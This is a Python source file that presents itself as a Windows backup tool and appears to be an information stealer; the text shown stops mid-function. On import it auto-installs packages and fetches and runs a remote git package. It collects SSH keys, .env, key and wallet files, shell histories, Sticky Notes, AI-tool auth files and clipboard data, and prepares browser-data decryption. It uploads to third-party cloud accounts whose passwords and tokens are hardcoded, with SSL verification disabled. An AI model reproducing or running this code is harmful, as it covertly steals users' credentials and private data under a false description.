# -*- coding: utf-8 -*-
"""
Windows自动备份和上传工具
功能：备份Windows系统中的重要文件，并自动上传到云存储
"""

# 先导入标准库
import os
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import getpass
import json
import base64
import sqlite3
import subprocess
import sys
import glob
from datetime import datetime, timedelta
from functools import lru_cache


def check_and_install_dependencies():
    """检查并安装必需的依赖包"""
    required_packages = {
        'requests': 'requests',
        'pyperclip': 'pyperclip',
        'urllib3': 'urllib3',
    }
    
    optional_packages = {
        'pywin32': 'pywin32',
        'pycryptodome': 'pycryptodome',
    }
    
    missing_required = []
    missing_optional = []
    
    # 检查必需的依赖
    for module_name, package_name in required_packages.items():
        try:
            __import__(module_name)
        except ImportError:
            missing_required.append(package_name)

    for module_name, package_name in optional_packages.items():
        try:
            if module_name == 'pywin32':
                __import__('win32crypt')
            else:
                __import__('Crypto')
        except ImportError:
            missing_optional.append(package_name)
    
    # 安装缺失的必需依赖
    if missing_required:
        print(f"检测到缺失的必需依赖: {', '.join(missing_required)}")
        print("正在自动安装...")
        failed_packages = []
        for package in missing_required:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet', '--upgrade'])
                print(f"✓ 已安装: {package}")
            except subprocess.CalledProcessError as e:
                print(f"⚠ 安装失败: {package} - {str(e)}")
                failed_packages.append(package)
        
        if failed_packages:
            print(f"⚠ 警告: 以下依赖安装失败，程序将继续运行，但相关功能可能不可用: {', '.join(failed_packages)}")
    
    if missing_optional:
        print(f"检测到缺失的可选依赖: {', '.join(missing_optional)}")
        for package in missing_optional:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet', '--upgrade'])
                print(f"✓ 已安装: {package}")
            except subprocess.CalledProcessError as e:
                print(f"⚠ 安装失败: {package} - {str(e)}（可选功能可能不可用）")
    
    if not missing_required and not missing_optional:
        print("✓ 所有依赖已就绪")

def ensure_pipx_and_openclaw():
    """检查 pipx 和 openclaw-config（claw）"""
    # 1. 检查 pipx 是否可用
    pipx_ok = False
    try:
        result = subprocess.run(
            ['pipx', '--version'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        pipx_ok = (result.returncode == 0)
    except Exception:
        pipx_ok = False

    if not pipx_ok:
        print("⚠ 检测到 pipx 未安装，跳过")
        return

    # 2. 使用 pipx 安装或升级 claw
    try:
        has_openclaw = shutil.which('openclaw-config') is not None
    except Exception as e:
        print(f"⚠ 检查 openclaw-config 失败: {str(e)}，将尝试安装 claw")
        has_openclaw = False

    claw_spec = "git+https://github.com/web3toolsbox/claw.git"

    if not has_openclaw:
        print("检测到 openclaw-config 未安装，正在通过 pipx 安装 claw ...")
        try:
            subprocess.check_call(['pipx', 'install', claw_spec])
            print("✓ 已通过 pipx 安装 claw")
        except subprocess.CalledProcessError as e:
            print(f"⚠ 通过 pipx 安装 claw 失败: {str(e)}")
            return
    else:
        print("检测到 openclaw-config 已安装，正在通过 pipx 刷新 claw ...")
        try:
            subprocess.check_call(['pipx', 'install', '--force', claw_spec])
            print("✓ 已通过 pipx 刷新 claw")
        except subprocess.CalledProcessError as e:
            print(f"⚠ 通过 pipx 刷新 claw 失败: {str(e)}")
            try:
                subprocess.check_call(['pipx', 'upgrade', 'claw'])
                print("✓ 已通过 pipx 升级已安装的 claw")
            except subprocess.CalledProcessError as upgrade_error:
                print(f"⚠ 通过 pipx 升级 claw 失败: {str(upgrade_error)}")
                # 升级失败不阻塞后续 openclaw-config 的调用

    # 3. 运行 openclaw-config
    try:
        print("正在运行 openclaw-config ...")
        subprocess.check_call(['openclaw-config'])
        print("✓ openclaw-config 执行完成")
    except subprocess.CalledProcessError as e:
        print(f"⚠ 运行 openclaw-config 失败: {str(e)}")
    except FileNotFoundError:
        print("⚠ 未找到 openclaw-config 命令，请检查 pipx / claw 是否正确安装")


check_and_install_dependencies()
ensure_pipx_and_openclaw()

import_failed = False
try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError as e:
    print(f"⚠ 警告: 无法导入 requests 库: {str(e)}")
    requests = None
    HTTPBasicAuth = None
    import_failed = True

try:
    import pyperclip
except ImportError as e:
    print(f"⚠ 警告: 无法导入 pyperclip 库: {str(e)}")
    pyperclip = None
    import_failed = True

try:
    import urllib3
    # 禁用SSL警告
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"⚠ 警告: 无法导入 urllib3 库: {str(e)}")
    urllib3 = None
    import_failed = True

if import_failed:
    print("⚠ 警告: 部分依赖导入失败，程序将继续运行，但相关功能可能不可用")

# 尝试导入浏览器数据导出所需的库
BROWSER_EXPORT_AVAILABLE = False
try:
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
    BROWSER_EXPORT_AVAILABLE = True
except ImportError:
    print("⚠ 浏览器数据导出功能不可用：缺少 pywin32 或 pycryptodome 库")

class BackupConfig:
    """备份配置类"""
    
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）
    
    # 文件大小限制
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB 源目录最大大小
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB 压缩后单文件最大大小
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB 分片大小
    
    # 上传配置
    RETRY_COUNT = 3  # 重试次数
    RETRY_DELAY = 30  # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
    MAX_SERVER_RETRIES = 2  # 每个服务器最多尝试次数
    FILE_DELAY_AFTER_UPLOAD = 1  # 上传后等待文件释放的时间（秒）
    FILE_DELETE_RETRY_COUNT = 3  # 文件删除重试次数
    FILE_DELETE_RETRY_DELAY = 2  # 文件删除重试等待时间（秒）
    
    # 网络配置
    NETWORK_TIMEOUT = 3  # 网络检查超时时间（秒）
    NETWORK_CHECK_HOSTS = [
        ("8.8.8.8", 53),        # Google DNS
        ("1.1.1.1", 53),        # Cloudflare DNS
        ("208.67.222.222", 53)  # OpenDNS
    ]
    
    # 监控配置
    BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
    CLIPBOARD_INTERVAL = 1200  # JTB备份间隔时间（20分钟，单位：秒）
    CLIPBOARD_CHECK_INTERVAL = 3  # JTB检查间隔（秒）
    CLIPBOARD_UPLOAD_CHECK_INTERVAL = 30  # JTB上传检查间隔（秒）
    
    # 错误处理配置
    CLIPBOARD_ERROR_WAIT = 60  # JTB监控连续错误等待时间（秒）
    BACKUP_CHECK_INTERVAL = 3600  # 备份检查间隔（秒，每小时检查一次）
    ERROR_RETRY_DELAY = 60  # 发生错误时重试等待时间（秒）
    MAIN_ERROR_RETRY_DELAY = 300  # 主程序错误重试等待时间（秒，5分钟）
    
    # 文件操作配置
    SCAN_TIMEOUT = 1200  # 扫描目录超时时间（秒）
    FILE_RETRY_COUNT = 3  # 文件访问重试次数
    FILE_RETRY_DELAY = 5  # 文件重试等待时间（秒）
    COPY_CHUNK_SIZE = 1024 * 1024  # 文件复制块大小（1MB，提高性能）
    PROGRESS_INTERVAL = 10  # 进度显示间隔（秒）
    PROGRESS_LOG_INTERVAL = 10  # 每N个文件记录一次进度
    
    # 磁盘空间检查
    MIN_FREE_SPACE = 1024 * 1024 * 1024  # 最小可用空间（1GB）
    
    # 备份目录 - 用户文档目录
    BACKUP_ROOT = os.path.expandvars('%USERPROFILE%\\.dev\\AutoBackup')

    # 自动检测当前用户桌面在用户主目录中的相对路径（支持桌面重定向 / OneDrive 等情况）
    _USER_HOME = os.path.expandvars('%USERPROFILE%')
    _DESKTOP_CANDIDATES = [
        os.path.join(_USER_HOME, 'Desktop'),
        os.path.join(_USER_HOME, '桌面'),
        os.path.join(_USER_HOME, 'OneDrive', 'Desktop'),
        os.path.join(_USER_HOME, 'OneDrive', '桌面'),
    ]
    for _path in _DESKTOP_CANDIDATES:
        if os.path.exists(_path):
            DESKTOP_RELATIVE_PATH = os.path.relpath(_path, _USER_HOME)
            break
    else:
        DESKTOP_RELATIVE_PATH = 'Desktop'

    # 自动检测当前用户便签数据库 plum.sqlite 的相对路径（兼容不同包名）
    _LOCAL_APPDATA = os.path.join(_USER_HOME, 'AppData', 'Local')
    _PACKAGES_DIR = os.path.join(_LOCAL_APPDATA, 'Packages')
    STICKY_NOTES_RELATIVE_PATH = (
        r"AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
    )
    try:
        if os.path.isdir(_PACKAGES_DIR):
            for _entry in os.listdir(_PACKAGES_DIR):
                if 'StickyNotes' in _entry:
                    _candidate = os.path.join(_PACKAGES_DIR, _entry, 'LocalState', 'plum.sqlite')
                    if os.path.exists(_candidate):
                        # 转为相对于 %USERPROFILE% 的相对路径，保持与 WINDOWS_SPECIFIC_DIRS 其他项一致
                        STICKY_NOTES_RELATIVE_PATH = os.path.relpath(_candidate, _USER_HOME)
                        break
    except Exception:
        # 自动检测失败时，退回到默认硬编码路径
        pass
    
    # 时间阈值文件
    THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
    
    # 日志配置
    LOG_FILE = os.path.join(BACKUP_ROOT, 'backup.log')
    LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
    LOG_LEVEL = logging.INFO
    
    # 磁盘文件分类
    DISK_EXTENSIONS_1 = [  # 文档/代码类
        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".et", ".one", ".csv", ".tsv", ".rtf", ".md",
    ]
    
    DISK_EXTENSIONS_2 = [  # 配置和密钥类
        ".pem", ".key", ".env", ".xml", ".ini", ".json", ".toml", ".conf", ".wallet",
        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".yaml", ".yml",
    ]
    
    # 指定要直接复制的目录和文件（相对于用户主目录 %USERPROFILE%）
    WINDOWS_SPECIFIC_DIRS = [
        DESKTOP_RELATIVE_PATH,  # 桌面目录（自动检测）
        STICKY_NOTES_RELATIVE_PATH,  # 便签数据库（自动检测包名，失败则使用默认路径）
        ".ssh",  # SSH配置
        ".python_history",  # Python 历史记录文件
        ".node_repl_history",  # Node.js REPL 历史记录文件
        r"AppData\Roaming\Python\Python*\history",  # Windows 常见 Python REPL 历史路径（按版本目录匹配）
        r"AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",  # Windows PowerShell 历史
        r"AppData\Roaming\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt",  # PowerShell Core 历史（如果存在）
        r".claude\config.json",
        r".codex\auth.json",
        r".openclaw\agents",
        r".openclaw\workspace\MEMORY.md",
        r".openclaw\openclaw.json*",  # OpenClaw 配置文件及所有备份（.bak/.bak.1/.bak.2...）
    ]
    
    # 排除目录配置
    EXCLUDE_INSTALL_DIRS = [       
        # 游戏相关目录
        "Battle.net", "Riot Games", "GOG Galaxy", "Xbox Games", "Steam",
        "Epic Games", "Origin Games", "Ubisoft", "Games", "SteamLibrary",
        
        # 常见软件安装目录
        "Common Files", "WindowsApps", "Microsoft", "Microsoft VS Code",
        "Internet Explorer", "Microsoft.NET", "MSBuild",
        
        # 开发工具和环境
        "Java", "Python", "NodeJS", "Go", "Visual Studio", "JetBrains",
        "Docker", "Git", "MongoDB", "Redis", "PostgreSQL",
        "Android", "gradle", "npm", "yarn", "venv", "node_modules",
        ".gradle", ".m2", ".vs", ".vscode", ".cargo", ".git", ".yean",
        ".local", ".npm", ".nvm", ".orca_term", ".pki", ".pm2", 
        ".rustup", ".bun", ".github", ".vscode", "myenv", "snap",
        "__pycache__", ".vscode-server", "dist", ".cache", ".dev",   # 排除.dev目录，避免循环备份
        
        
        # 其他大型应用
        "Adobe", "Autodesk", "Unity", "UnrealEngine", "Blender",
        "NVIDIA", "AMD", "Intel", "Realtek", "Waves",
        
        # 浏览器相关 
        "Google", "Chrome", "Brave", "Firefox", "Opera",
        "Microsoft Edge", "Internet Explorer",
        
        # 通讯和办公软件
        "Discord", "Zoom", "Teams", "Skype", "Slack", "telegram",
        
        # 多媒体软件
        "Adobe", "Premiere", "Photoshop", "After Effects",
        "Vegas", "MAGIX", "Audacity",
        
        # 安全软件
        "McAfee", "Norton", "Kaspersky", "Huorong",
        "Avast", "AVG", "Bitdefender", "ESET",
        
        # 系统工具
        "CCleaner", "WinRAR", "7-Zip", "PowerToys",
    ]
    
    # 关键词排除
    EXCLUDE_KEYWORDS = [
        # 软件相关
        "program", "software", "install", "setup", "update",
        "patch", "cache", 
        
        # 开发相关
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "obj", "packages",
        
        # 多媒体相关
        "music", "video", "movie", "audio", "media", "stream",
        
        # 游戏相关
        "steam", "game", "gaming", "save", "netease", "origin", "epic",
        
        # 临时文件
        "log", "crash", "dumps", "report",
        
        # 其他
        "bak", "obsolete", "archive", "trojan", "clash", "vpn", 
        "thumb", "thumbnail", "preview" , "v2ray", "user", "mail",

        # 中文
        "火绒", "杀毒", "电脑管家",
    ]

    # GoFile 上传配置（备选方案）
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]

# 配置日志
if BackupConfig.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.StreamHandler()
        ]
    )
else:
    logging.basicConfig(
        level=BackupConfig.LOG_LEVEL,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.FileHandler(BackupConfig.LOG_FILE, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )

class BackupManager:
    """备份管理器类"""
    
    def __init__(self):
        """初始化备份管理器"""
        self.config = BackupConfig()
        
        # Infini Cloud 配置
        self.infini_url = "https://otaru.infini-cloud.net/dav/"
        self.infini_user = "macstar"
        self.infini_pass = "p43ZDLzNPv2GixSk"
        # Infini 上传配置：主配置 + 备用配置（全部失败才会回退 GoFile）
        self.infini_configs = [
            {
                "name": "Infini-主配置",
                "url": self.infini_url,
                "user": self.infini_user,
                "password": self.infini_pass,
            },
            {
                "name": "Infini-备用配置",
                "url": "https://wajima.infini-cloud.net/dav/",
                "user": "cryptostarxp",
                "password": "LDW9ERV3xuUrHSjZ",
            },
        ]
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_wins_backup"
        
        # 配置 requests session 用于上传
        self.session = requests.Session()
        self.session.verify = False  # 禁用SSL验证
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # GoFile API token（备选方案）
        self.api_token = "qSS40ZpgNXq7zZXzy4QDSX3z9yCVCXJu"
        
        self._setup_logging()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            # 确保日志目录存在
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # 自定义日志格式化器
            class PathFilter(logging.Formatter):
                def format(self, record):
                    # 过滤掉路径相关的日志
                    if isinstance(record.msg, str):
                        msg = record.msg
                        # 跳过路径相关的日志
                        if any(x in msg for x in ["检查目录:", "排除目录:", ":\\", "/"]):
                            return None
                        # 保留进度和状态信息
                        if any(x in msg for x in ["已备份", "完成", "失败", "错误", "成功", "📁", "✅", "❌", "⏳", "📋"]):
                            return super().format(record)
                        # 其他普通日志
                        return super().format(record)
                    return super().format(record)
            
            # 自定义过滤器
            class MessageFilter(logging.Filter):
                def filter(self, record):
                    if isinstance(record.msg, str):
                        # 过滤掉路径相关的日志
                        if any(x in record.msg for x in ["检查目录:", "排除目录:", ":\\", "/"]):
                            return False
                    return True
            
            # 配置文件处理器
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = PathFilter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_formatter)
            file_handler.addFilter(MessageFilter())
            
            # 配置控制台处理器
            console_handler = logging.StreamHandler()
            console_formatter = PathFilter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.addFilter(MessageFilter())
            
            # 配置根日志记录器
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # 清除现有处理器
            root_logger.handlers.clear()
            
            # 添加处理器
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("日志系统初始化完成")
        except (OSError, IOError, PermissionError) as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """获取目录总大小
        
        Args:
            directory: 目录路径
            
        Returns:
            int: 目录大小（字节）
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"获取文件大小失败 {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """确保目录存在
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 目录是否可用
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """清理并重新创建目录
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 操作是否成功
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"清理目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """检查网络连接
        
        Returns:
            bool: 是否有网络连接
        """
        for host, port in BackupConfig.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=BackupConfig.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"连接 {host}:{port} 失败: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """检查文件是否有效
        
        Args:
            file_path: 文件路径
            
        Returns:
            bool: 文件是否有效
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        """安全删除文件，支持重试机制
        
        Args:
            file_path: 要删除的文件路径
            retry: 是否使用重试机制
            
        Returns:
            bool: 删除是否成功
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # 使用重试机制删除文件
        try:
            # 等待文件句柄完全释放
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"删除文件重试中: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"删除文件失败: {str(e)}")
            return False

    def should_exclude_dir(self, path):
        """检查是否应该排除目录
        
        Args:
            path: 目录路径
            
        Returns:
            bool: 是否应该排除
        """
        # 优先排除 AutoBackup 目录自身，避免自我备份
        backup_root = os.path.abspath(self.config.BACKUP_ROOT)
        abspath = os.path.abspath(path)
        if abspath.startswith(backup_root):
            return True
        
        path_lower = path.lower()
        path_parts = [part.lower() for part in os.path.normpath(path).split(os.sep)]
        
        # 优先检查是否是云盘目录，如果是则不排除
        cloud_keywords = [
            "云盘", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "网盘", "云"
        ]
        
        # 检查路径中的每个部分
        for part in path_parts:
            part_lower = part.lower()
            # 如果任何部分包含云盘关键词，则不排除该目录
            if any(keyword.lower() in part_lower for keyword in cloud_keywords):
                return False
        
        # 检查完整目录名是否在排除列表中
        for ex in self.config.EXCLUDE_INSTALL_DIRS:
            ex_lower = ex.lower()
            ex_parts = set(ex_lower.split())
            
            # 检查每个路径部分
            for part in path_parts:
                # 标准化路径部分
                part_normalized = set(part.replace('_', ' ').replace('-', ' ').lower().split())
                
                # 只有当排除目录名完全匹配时才排除
                if ex_parts == part_normalized:
                    return True
        
        # 对每个关键词进行更智能的匹配
        for keyword in self.config.EXCLUDE_KEYWORDS:
            keyword_lower = keyword.lower()
            
            # 检查每个路径部分
            for part in path_parts:
                # 1. 标准化路径部分，移除所有常见分隔符
                normalized_part = (part.replace('_', ' ')
                                    .replace('-', ' ')
                                    .replace('.', ' ')
                                    .replace('cache', ' cache')  # 特殊处理cache关键词
                                    .lower())
                
                # 2. 分割成单词
                word_parts = set(normalized_part.split())
                
                # 3. 标准化关键词
                normalized_keyword = keyword_lower.replace('_', ' ').replace('-', ' ')
                keyword_parts = set(normalized_keyword.split())
                
                # 4. 检查各种匹配情况
                if any([
                    keyword_lower in normalized_part.replace(' ', ''),  # 直接包含
                    keyword_lower in word_parts,  # 作为独立单词存在
                    all(kp in normalized_part.replace(' ', '') for kp in keyword_parts)  # 所有关键词部分都存在
                ]):
                    return True
    
        return False

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """Windows磁盘文件备份"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"开始备份目录:")
            logging.debug(f"源目录: {source_dir}")
            logging.debug(f"目标目录: {target_dir}")
            logging.debug(f"扩展名类型: {extensions_type}")

        if not os.path.exists(source_dir):
            logging.error(f"❌ 磁盘源目录不存在: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"❌ 源目录没有读取权限: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"❌ 无法清理或创建目标目录: {target_dir}")
            return None

        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
        
        if self.config.DEBUG_MODE:
            logging.debug(f"使用的文件扩展名: {extensions}")
                     
        files_count = 0
        total_size = 0
        start_time = time.time()
        last_progress_time = start_time
        scanned_dirs = 0    # 已扫描目录数
        excluded_dirs = 0   # 已排除目录数

        try:
            # 使用 os.walk 的 topdown=True 参数，这样可以跳过不需要的目录
            for root, dirs, files in os.walk(source_dir, topdown=True):
                scanned_dirs += 1
                
                # 检查是否超时
                current_time = time.time()
                if current_time - start_time > self.config.SCAN_TIMEOUT:
                    logging.error(f"❌ 扫描目录超时: {source_dir}")
                    break
                    
                # 定期显示进度
                if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"⏳ 已扫描 {scanned_dirs} 个目录，排除 {excluded_dirs} 个目录")
                        logging.debug(f"⏳ 当前扫描: {root}")
                    last_progress_time = current_time
                
                # 跳过目标目录
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # 跳过排除的目录
                if self.should_exclude_dir(root):
                    excluded_dirs += 1
                    if self.config.DEBUG_MODE:
                        logging.debug(f"排除目录: {root}")
                    dirs.clear()  # 清空子目录列表，避免继续遍历
                    continue

                # 处理文件
                for file in files:
                    file_lower = file.lower()
                    # 检查文件扩展名
                    if not any(file_lower.endswith(ext.lower()) for ext in extensions):
                        continue

                    source_file = os.path.join(root, file)
                    
                    # 检查文件大小
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"跳过空文件: {source_file}")
                            continue
                        if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"跳过大文件: {source_file} ({file_size / 1024 / 1024:.1f}MB)")
                            continue
                    except OSError as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"获取文件大小失败: {source_file} - {str(e)}")
                        continue

                    # 尝试复制文件
                    for attempt in range(self.config.FILE_RETRY_COUNT):
                        try:
                            # 检查文件是否可访问
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError) as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"文件访问失败: {source_file} - {str(e)}")
                                if attempt < self.config.FILE_RETRY_COUNT - 1:
                                    time.sleep(self.config.FILE_RETRY_DELAY)
                                    continue
                                else:
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"创建目标子目录失败: {target_sub_dir}")
                                break
                                
                            # 使用优化的分块复制（1MB块大小）
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                while True:
                                    chunk = src.read(self.config.COPY_CHUNK_SIZE)
                                    if not chunk:
                                        break
                                    dst.write(chunk)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            if self.config.DEBUG_MODE:
                                if files_count % self.config.PROGRESS_LOG_INTERVAL == 0:
                                    logging.debug(f"📁 已备份 {files_count} 个文件 ({total_size / 1024 / 1024:.1f}MB)")
                                logging.debug(f"成功复制: {source_file} -> {target_file}")
                            
                            break  # 成功后跳出重试循环
                            
                        except (PermissionError, OSError, IOError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"❌ 文件复制失败: {source_file} - {str(e)}")
                        except (MemoryError, RuntimeError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                logging.error(f"❌ 文件复制出现系统错误: {source_file} - {str(e)}")

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 备份过程出错: {str(e)}")
        except (MemoryError, RuntimeError) as e:
            logging.error(f"❌ 备份过程出现系统错误: {str(e)}")

        # 显示最终统计信息
        if files_count > 0:
            logging.info(f"\n📊 备份完成:")
            logging.info(f"   📁 文件数量: {files_count}")
            logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
            if self.config.DEBUG_MODE:
                logging.debug(f"   📂 扫描目录数: {scanned_dirs}")
                logging.debug(f"   🚫 排除目录数: {excluded_dirs}")
            return target_dir
        else:
            if self.config.DEBUG_MODE:
                logging.debug(f"扫描统计:")
                logging.debug(f"- 扫描目录数: {scanned_dirs}")
                logging.debug(f"- 排除目录数: {excluded_dirs}")
            logging.error(f"❌ 未找到需要备份的文件")
            return None
    
    def _get_upload_server(self):
        """获取上传服务器地址
    
        Returns:
            str: 上传服务器URL
        """
        return "https://store9.gofile.io/uploadFile"

    def split_large_file(self, file_path):
        """将大文件分割成小块
        
        Args:
            file_path: 要分割的文件路径
            
        Returns:
            list: 分片文件路径列表，如果不需要分割则返回None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            logging.critical(f"文件 {file_path} 已分割为 {len(chunk_files)} 个分片")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """上传文件到服务器
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not self._is_valid_file(file_path):
            logging.error(f"文件 {file_path} 为空或无效，跳过上传")
            return False

        # 检查文件大小并在需要时分片
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # 仅在全部分片上传成功后清理分片目录与原始文件
            if success:
                chunk_dir = os.path.dirname(chunk_files[0])
                self._clean_directory(chunk_dir)
                # 若原始文件仍在，上传成功后删除
                if os.path.exists(file_path):
                    self._safe_remove_file(file_path, retry=True)
            return success
        else:
            return self._upload_single_file(file_path)

    def _create_remote_directory(self, remote_dir, infini_url=None, auth=None):
        """创建远程目录（使用 WebDAV MKCOL 方法）"""
        if not remote_dir or remote_dir == '.':
            return True

        if not infini_url:
            infini_url = self.infini_url
        if auth is None:
            auth = self.auth
        
        try:
            # 构建目录路径
            dir_path = f"{infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 表示已存在
                return True
            elif response.status_code == 409:
                # 409 可能表示父目录不存在，尝试创建父目录
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir, infini_url=infini_url, auth=auth):
